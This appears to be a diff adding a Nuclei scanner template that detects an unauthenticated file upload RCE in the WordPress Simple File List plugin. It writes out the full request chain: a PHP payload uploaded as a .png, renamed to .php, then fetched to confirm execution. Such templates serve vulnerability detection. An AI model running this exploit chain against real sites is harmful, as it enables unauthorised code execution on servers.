@@ -1,0 +1,78 @@
+id: wordpress-rce-simplefilelist
+
+info:
+  name: WordPress SimpleFilelist Unauthenticated Arbitrary File Upload RCE
+  author: princechaddha
+  severity: critical
+  reference: https://wpscan.com/vulnerability/10192
+  description: |
+    The Simple File List WordPress plugin was found to be vulnerable to an unauthenticated arbitrary file upload leading to remote code execution. The Python exploit first uploads a file containing PHP code but with a png image file extension. A second request is sent to move (rename) the png file to a PHP file.
+  tags: wordpress,wp-plugin,rce
+
+requests:
+  - raw:
+      - |
+        POST /wp-content/plugins/simple-file-list/ee-upload-engine.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+        Content-Length: 693
+        Content-Type: multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2
+
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="eeSFL_ID"
+
+        1
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="eeSFL_FileUploadDir"
+
+        /wp-content/uploads/simple-file-list/
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="eeSFL_Timestamp"
+
+        1587258885
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="eeSFL_Token"
+
+        ba288252629a5399759b6fde1e205bc2
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="file"; filename="nuclei.png"
+        Content-Type: image/png
+
+        <?php echo "Nuclei - Open source project (github.com/projectdiscovery/nuclei)"; phpinfo(); ?>
+        --6985fa39c0698d07f6d418b37388e1b2--
+
+      - |
+        POST /wp-content/plugins/simple-file-list/ee-file-engine.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.25.1
+        Accept: */*
+        Connection: close
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 81
+        Content-Type: application/x-www-form-urlencoded
+
+        eeSFL_ID=1&eeFileOld=nuclei.png&eeListFolder=%2F&eeFileAction=Rename%7Cnuclei.php
+
+      - |
+        GET /wp-content/uploads/simple-file-list/nuclei.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'Nuclei - Open source project (github.com/projectdiscovery/nuclei)'
+          - "PHP Version"
+          - "Configuration Command"
+        part: body
+        condition: and
+      - type: word
+        words:
+          - 'text/html'
+        part: header
+      - type: status
+        status:
+          - 200
